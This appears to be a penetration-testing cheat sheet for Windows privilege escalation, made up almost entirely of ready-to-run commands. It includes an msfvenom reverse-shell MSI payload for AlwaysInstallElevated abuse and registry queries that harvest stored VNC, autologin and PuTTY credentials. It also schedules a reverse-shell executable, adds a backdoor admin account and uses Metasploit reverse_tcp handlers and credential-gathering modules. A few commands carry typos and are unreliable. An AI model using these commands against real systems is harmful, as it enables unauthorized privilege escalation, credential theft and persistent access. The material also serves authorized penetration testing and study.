# Windows-Privilege-Escalation
Privilege Escalation Techniques in Windows Environments

## Enumeration
```
hostname

whoami

whoami /priv

echo %username%

systeminfo

net users

net users <username>

net share

ipconfig /all

arp -a

route print

netsh firewall show

netsh advfirewall show currentprofile

netsh advfirewall show allprofiles

netstat -ano
```

## WMI Queries
```
wmic /?

wmic bios

wmic bios list /format

wmic cpu /?

wmic cpu

wmic cpu get Architecture,NumberOfCores

wmic Desktop list /format

wmic memorychip

wmic netlogin list /format

wmic nic list /format

wmic nic list /format:xml

wmic nic list /format:hform > temp.html

wmic os list /format

wmic server

wmic startup

wmic qfe list /format
```

## AlwaysInstallElevated
```
#Check if AlwaysInstalledElevated is installed (1) or not (0)
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated

use exploit/multi/handler

set payload windows/meterpreter/reverse_tcp

# Metasploit Module, Automatic Process
use exploit/windows/local/always_install_elevated

# Manual Process to Get Elevated Privilege
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<IP> -f msi > escalate.msi
```

## Searching For Credentials
```
dir unattend.* /s

dir sysprep.* /s

findstr /si "password" *.txt *.ini

#VNC
reg query "HKCU\Software\ORL\WinVNC3\Password"

#Windows autologin
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon"

#SNMP Parameters
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"

#Putty
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"

#Search for password in registry
reg query HKLM /f password /t REG_SG /s
reg query HKCU /f password /t REG_SZ /s
```

## at Command and Sticky Keys
```
at 10:23 C:\reverse_shell.exe
at /delete

net user /add <username> <password>

net localgroup administrator /add <username>
```

## Metasploit Modules
```
# Multi Handler
use exploit/multi/handler

# Payload
set payload windows/meterpreter/reverse_tcp

# Check if machine is a VM ?
# checkvm
use post/windows/gather/checkvm

# Enumerate Applications
use post/windows/gather/enum_applications

# Enumerate Internet Explorer
use post/windows/gather/enum_ie

# Enumerate Chrome
search enum_chrome

# Enumerate SNMP
use post/windows/gather/enum_snmp

# Enumerate Shares
use post/windows/gather/enum_shares

# Enumerate Logged on Users
use post/windows/gather/enum_logged_on_users

# Enumerate GPP
use post/windows/gather/credentials/gpp

# Enumerate Service Permissions
use exploit/windows/local/service_permissions

# Local Exploit Suggester
use post/multi/recon/local_exploit_suggester
```
